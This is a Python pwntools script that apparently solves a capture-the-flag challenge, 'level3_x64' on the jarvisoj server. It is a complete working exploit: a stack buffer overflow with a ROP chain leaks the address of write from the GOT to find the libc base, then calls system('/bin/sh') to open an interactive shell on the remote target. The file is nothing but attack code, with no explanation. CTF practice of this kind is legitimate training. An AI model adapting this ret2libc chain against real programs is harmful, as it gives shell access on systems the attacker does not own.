#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./level3_x64"
#  context.log_level = 'debug'
elf = context.binary

if sys.argv[1] == "l":
    io = process("./level3_x64")
    libc = elf.libc
else:
    io = remote("pwn2.jarvisoj.com",9883)
    libc = ELF("./libc-2.19.so")


prdi = 0x4006B3
prsi = 0x4006B1

io.sendlineafter("Input:\n", flat(cyclic(0x88), prdi, 1, prsi, elf.got['write'], 0, elf.plt['write'], elf.sym['vulnerable_function']))
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['write']
success("libc -> {:#x}".format(libc.address))


io.sendlineafter("Input:\n", flat(cyclic(0x88), prdi, next(libc.search("/bin/sh")), libc.sym['system']))

io.interactive()
